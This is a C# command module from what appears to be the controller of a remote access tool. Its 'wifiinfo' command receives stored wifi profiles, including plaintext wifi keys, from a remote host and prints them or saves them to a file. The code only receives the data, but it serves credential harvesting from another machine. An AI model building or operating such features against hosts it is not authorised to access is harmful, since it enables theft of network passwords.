using System;
using System.Collections.Generic;
using System.IO;
using Client.AdvancedConsole;
using Client.Commands.Core;

namespace Client.Commands
{
    internal class WifiInfo : IClientCommand
    {
        public string name { get; } = "wifiinfo";

        public string description { get; } = "Get informations about the stored wifi profiles on the remote host, including clear wifi keys";

        public string syntaxHelper { get; } = "wifiinfo [fileName]";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "",
            "?"
        };

        
        public void Process(List<string> args)
        {
            ColorTools.WriteCommandMessage("Processing your request...");
            ColorTools.WriteCommandMessage("This might take a long time depending on the remote stored wifi informations count");

            var data = "";
            while (true)
            {
                var tempData = ClientCommandsManager.networkManager.ReadLine();
                if (tempData == "{end}") break;
                data += $"{tempData}\n\r";
            }

            if (args.Count == 1)
            {
                try
                {
                    File.WriteAllText(args[0], data);
                    ColorTools.WriteCommandSuccess($"Wlan informations wrote into {args[0]}");
                }
                catch (IOException)
                {
                    ColorTools.WriteCommandError("Could not write into the specified file");
                }
            }
            else
            {
                Console.WriteLine(data);
            }
        }
    }
}
